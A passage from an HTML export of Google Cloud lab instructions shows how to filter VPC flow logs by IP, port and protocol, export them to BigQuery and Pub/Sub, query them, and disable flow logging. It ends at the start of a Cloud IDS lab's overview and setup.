class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">resource.type="gce_subnetwork"</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">log_name="projects/&lt;INSERT_PROJECT_ID&gt;/logs/compute.googleapis.com%2Fvpc_flows"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Run query</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> For the remainder of this lab, be sure to always leave these two lines at the start of the filter. You will be adding additional lines after these two. If you accidentally delete or modify these two lines, copy them from above (be sure to change the project ID).</span></p><h5 id='access-logs-for-a-specific-source-or-destination-ip-address'><strong><span>Access logs for a specific source or destination IP address</span></strong></h5><ol start='' ><li><p><span>Add the following line to the end of the filter. Replace </span><code>Internal_IP_Of_default_us_vm</code><span> with the internal IP address of your </span><code>default_us_vm</code><span> instance (you recorded this earlier):</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">jsonPayload.connection.src_ip="Internal_IP_Of_default_us_vm"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Run query</span></strong><span>.</span></p></li></ol><p><span>You now see all the log entries where the source IP address is the internal IP address of the </span><code>default-us-vm</code><span> instance. These should be the same entries as for the earlier filter that showed the source instance of </span><code>default-us-vm</code><span>.</span></p><h5 id='access-logs-for-specific-ports-and-protocols'><strong><span>Access logs for specific ports and protocols</span></strong></h5><ol start='' ><li><p><span>Delete the last line in the filter (the one matching </span><code>src_ip</code><span>) and replace it with the following line that will only show entries with a destination port of 22 (SSH):</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">jsonPayload.connection.dest_port=22</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Run query</span></strong><span> and observe the results. You should see three logs because you SSH-ed into the VMs three times.</span></p></li><li><p><span>Modify the last line of the filter to only show traffic with a destination port of 80 (HTTP):</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">jsonPayload.connection.dest_port=80</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Run query</span></strong><span> and observe the results.</span></p></li><li><p><span>Match multiple ports by replacing the last line and adding this statment with an </span><code>OR</code><span> to the end of the port filter:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">jsonPayload.connection.dest_port=(80 OR 22)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Change the last line in the filter to only show entries using the UDP protocol (protocol #17):</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">jsonPayload.connection.protocol=17</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Run query</span></strong><span> and observe the results.</span></p></li></ol><p><span>You may see a few entries in the log. These would correspond to the DNS calls you made with the host utility.</span></p><ol start='' ><li><p><span>Investigate one of the log entries and locate the destination port number that DNS uses.</span></p></li></ol><p><strong><span>Note:</span></strong><span> DNS uses port 53.</span></p><ol start='' ><li><p><span>Modify the filter to show all entries with a protocol of 17 and destination port of 53:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">jsonPayload.connection.protocol=17</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">jsonPayload.connection.dest_port=53</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Run query</span></strong><span> and observe the results.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Currently, flow logs only monitor UDP (protocol #17) and TCP (protocol #6). Earlier, you generated some ICMP traffic on the instances using </span><code>ping</code><span>. ICMP is protocol #1. If you create a filter to show protocol #1, you will not see any entries. Try this if you want.</span></p><h4 id='task-5-perform-network-monitoring-and-support-real-time-security-analysis'><span>Task 5. Perform network monitoring and support real-time security analysis</span></h4><p><span>In this task, you create a filter and use it to see whether any RDP traffic is attempting to access the VPC.</span></p><h5 id='search-for-unexpected-ports-and-protocols'><strong><span>Search for unexpected ports and protocols</span></strong></h5><p><span>Because you are running Linux instances within the VPC network, you should not see any RDP traffic. However, there is a firewall rule within the default settings that allows RDP traffic from anywhere, and this means that someone or something on the internet could attempt to connect to your servers using the RDP protocol.</span></p><ol start='' ><li><p><span>Modify the flow log filter to show all traffic with a destination port of 3389 (RDP). Be sure to leave the first two lines of the existing filter, but delete and replace the other lines with the following and click </span><strong><span>Run query</span></strong><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">jsonPayload.connection.dest_port=3389</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>If you see any RDP traffic, investigate where the traffic is coming from. You may not see any RDP traffic, but it is common to see at least some. If you did not see any traffic, wait a few minutes and check again.</span></p></li></ol><p><span>If you did see some RDP traffic, which often happens, that demonstrates how pervasive unwanted traffic can be on the internet. It also shows why ensuring that VPC networks and firewall rules are set up correctly is important.</span></p><p><span>By using the default VPC in this lab, with all of the default firewall rules, you saw the results of not fine-tuning these rules to help exclude unwanted traffic.</span></p><p><strong><span>Note:</span></strong><span> It is a recommended best practice for production systems to use a custom VPC with very specific firewall rules and delete the default VPC.</span></p><p><strong><span>Note:</span></strong><span> Another service that can help with issues like restricting unwanted traffic is </span><a href='https://cloud.google.com/armor/'><span>Google Cloud Armor</span></a><span>. Google Cloud Armor delivers defense at scale against infrastructure and application Distributed Denial of Service (DDoS) attacks using Google&#39;s global infrastructure and security systems.</span></p><h5 id='create-exports-to-support-real-time-security-analysis'><span>Create exports to support real-time security analysis</span></h5><p><span>Flow logs can be exported to any destination that Cloud Logging export supports (Pub/Sub, BigQuery, etc.). Creating an export will export future matching logs to the selected destination, existing logs will not be exported.</span></p><p><span>Exporting logs to BigQuery allows for the BigQuery analysis tools to be used on your logs to perform analysis. Exporting logs to Pub/Sub allows your logs to be streamed to other applications, other repositories, or third parties.</span></p><p><span>When you create a Cloud export, the current filter will be applied to the export. This means that only events that match the filter will be exported. For example, if you have a filter that only displays traffic to the destination port 3389, only traffic that matches that filter will be exported.</span></p><p><span>This can help reduce the amount of data that is exported (which could lower costs) or allow for different exports depending on what the data contains. For this lab you will clear the filter and export all logs because you do not have much traffic.</span></p><ol start='' ><li><p><span>Clear all the text in the query editor and click </span><strong><span>Run query</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Actions</span></strong><span> &gt; </span><strong><span>Create Sink</span></strong><span>.</span></p></li><li><p><span>For &quot;Sink name&quot;, type </span><strong><span>FlowLogBQExport</span></strong><span> and click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>For &quot;Select sink service&quot;, select </span><strong><span>BigQuery dataset</span></strong><span>.</span></p></li><li><p><span>For &quot;Select Bigquery dataset&quot;, select </span><strong><span>Create new BigQuery dataset</span></strong><span>.</span></p></li><li><p><span>For &quot;Dataset ID&quot;, type </span><code>flowlogs_dataset</code><span>, and then click </span><strong><span>Create dataset</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create sink</span></strong><span>. The Logs Router Sinks page appears.</span></p></li></ol><p><span>You should be able to see the sink you created </span><strong><span>(FlowLogBQExport)</span></strong><span>. If you are unable to see the sink click on </span><strong><span>Logs Router</span></strong><span>.</span></p><ol start='' ><li><p><span>On the right side, click the </span><strong><span>More actions</span></strong><span> menu (</span><img src="https://cdn.qwiklabs.com/EAVAvFhminZXqeUIlGzj2ylRyw7YT4PycCIK1UZk3M4%3D" referrerpolicy="no-referrer" alt="more_menu.png"><span>) for your export and select </span><strong><span>View sink details</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Cancel</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> All future logs will now be exported to BigQuery. The BigQuery tools can now be used to perform analysis on the flow log data. You will perform a simple query in BigQuery later in the lab.</span></p><p><strong><span>Note:</span></strong><span> You could also export log entries to Pub/Sub or Cloud Storage. Exporting to Pub/Sub can be useful if you want to flow through an ETL process before storing in a database </span><strong><span>(Operations &gt; Pub/Sub &gt; Dataflow &gt; BigQuery/Cloud Bigtable)</span></strong><span>. Exporting to Cloud Storage will batch up entries and write them into Cloud Storage objects approximately every hour.</span></p><p><span>Now create an export to Pub/Sub.</span></p><ol start='' ><li><p><span>On the Logs Router page, click </span><strong><span>Create sink</span></strong><span>.</span></p></li><li><p><span>For &quot;Sink name&quot;, type </span><strong><span>FlowLogPubSubExport</span></strong><span>, and click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Select &quot;Select sink service&quot; as </span><strong><span>Cloud Pub/Sub topic</span></strong><span>.</span></p></li><li><p><span>For &quot;Select a Cloud Pub/Sub topic&quot;, select </span><strong><span>Create a Topic</span></strong><span>.</span></p></li><li><p><span>For Topic ID, type </span><strong><span>FlowLogsTopic</span></strong><span>, and then click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create sink</span></strong><span>.</span></p></li></ol><p><span>The Logs Router Sinks page appears. You should be able to see the sink you created (FlowLogsTopic). If you are unable to see the sink click on </span><strong><span>Logs Router</span></strong><span>.</span></p><ol start='' ><li><p><span>On the right side, click the </span><strong><span>More actions</span></strong><span> menu for your export and select </span><strong><span>View sink details</span></strong><span>.</span></p></li></ol><p><span>This will show the filter that was present when the export was created.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Cancel</span></strong><span>.</span></p></li></ol><p><span>You can now subscribe to the new Pub/Sub topic and receive notifications when new logs are available. This allows for the logs to be streamed to and integrated with a SIEM (Security Information and Event Management) tool.</span></p><p><span>SIEM tools are used to gain real-time operational insights and create audit reports using powerful visualization capabilities.</span></p><h4 id='task-6-analyzing-flow-logs-in-bigquery'><span>Task 6. Analyzing flow logs in BigQuery</span></h4><p><span>In this task, you analyze flow logs in BigQuery.</span></p><p><strong><span>Note:</span></strong><span> When you export logs to a BigQuery dataset, Cloud Logging creates dated tables to hold the exported log entries. Log entries are placed in tables whose names are based on the entries&#39; log names.</span></p><ol start='' ><li><p><span>In the Cloud Console, on the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>BigQuery</span></strong><span>.</span></p></li><li><p><span>In the navigation pane under </span><strong><span>Explorer</span></strong><span>, expand the project name to see the </span><strong><span>flowlogs_dataset</span></strong><span> dataset.</span></p></li><li><p><span>Expand the dataset to see the table with your exported flow logs.</span></p></li><li><p><span>Click on the table name that starts with </span><code>compute_googleapis_com_vpc_flows_</code><span> and review the schemas and details of the tables that are being used.</span></p></li></ol><p><strong><span>Note:</span></strong><span> If you don&#39;t see that table appear in the dataset, open the navigation menu and click &quot;Cloud Overview&quot; or any other service. Then, open the navigation menu and select BigQuery and try to find the table again (it sometimes takes a minute or two for the table to appear in the dataset).</span></p><ol start='' ><li><p><span>Click </span><strong><span>Query</span></strong><span>.</span></p></li><li><p><span>Delete the text provided in the </span><strong><span>New query</span></strong><span> window and paste in the query below:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#standardSQL</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SELECT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; jsonPayload.connection.dest_ip,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; resource</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">FROM</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; `flowlogs_dataset.compute_googleapis_com_vpc_flows*` WHERE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; jsonPayload.connection.dest_port = 22</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">LIMIT 1000</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 180px;"></div><div class="CodeMirror-gutters" style="display: none; height: 180px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Run</span></strong><span>.</span></p></li></ol><p><span>This query returns information about traffic connecting to port 22.</span></p><p><span>After a couple of seconds, the results are displayed. You should see one or two entries, which is the activity you generated in this lab. Remember, BigQuery is only showing activity since the export was created.</span></p><p><strong><span>Note:</span></strong><span> If you did not see any results, you may need to generate some traffic to the instances. To do so, go to the </span><strong><span>Navigation menu &gt; Compute Engine</span></strong><span> and click </span><strong><span>SSH</span></strong><span> for each instance. Then try the query again.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create exports and analyze flow logs in BigQuery</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-7-disable-flow-logging'><span>Task 7. Disable flow logging</span></h4><p><span>In this task, you disable VPC flow logging. VPC flow logging can be turned off with the </span><code>--no-enable-flow-logs</code><span> option.</span></p><ol start='' ><li><p><span>Try disabling it on one of your subnets by running the following command in the Cloud Shell terminal:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks subnets update default \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--region europe-west4 --no-enable-flow-logs</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>You can verify that it has been disabled by viewing the VPC in the Cloud Console. On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>VPC network &gt; VPC networks</span></strong><span>. If prompted click on </span><strong><span>LEAVE</span></strong><span>.</span></p></li></ol><h4 id='task-8-review'><span>Task 8. Review</span></h4><p><span>In this lab, you enabled VPC flow logging for a subnet. You accessed logs via Cloud Logging. You also filtered logs for specific subnets, VMs, ports, and protocols. Next, you performed network monitoring, forensics, and real-time security analysis. Finally, you disabled VPC flow logging.</span></p><h3 id='lab---getting-started-with-cloud-ids-2'><span>LAB - Getting Started with Cloud IDS</span></h3><h4 id='overview-12'><span>Overview</span></h4><p><span>In this lab, you deploy </span><a href='https://cloud.google.com/intrusion-detection-system'><span>Cloud Intrusion Detection System (Cloud IDS)</span></a><span>, a next-generation advanced intrusion detection service that provides threat detection for intrusions, malware, spyware, and command-and-control attacks. You simulate multiple attacks and view the threat details in the Google Cloud console.</span></p><p><img src="images/ENIYqVr9SB12IcIIqVmupO%2BfT7DCqkiZdHgtHJtYDuA%3D.png" referrerpolicy="no-referrer" alt="Cloud IDS Infrastructure Diagram"></p><h4 id='objectives-9'><span>Objectives</span></h4><p><span>In this lab, you learn how to perform the following tasks:</span></p><ul><li><p><span>Build out a Google Cloud networking environment as shown in the previous diagram.</span></p></li><li><p><span>Create a Cloud IDS endpoint.</span></p></li><li><p><span>Create two virtual machines using gcloud CLI commands.</span></p></li><li><p><span>Create a Cloud IDS packet mirroring policy.</span></p></li><li><p><span>Simulate attack traffic from a virtual machine.</span></p></li><li><p><span>View threat details in the Cloud console and Cloud Logging.</span></p></li></ul><h4 id='setup-3'><span>Setup</span></h4><h5 id='before-you-click-the-start-lab-button-5'><span>Before you click the Start Lab button</span></h5><p><strong><span>Note: Read these instructions.</span></strong></p><p>&nbsp;</p><p><span>Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources will be made available to you.</span></p><p><span>This Qwiklabs hands-on lab lets you do the lab activities yourself in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials that you use to sign in and access Google 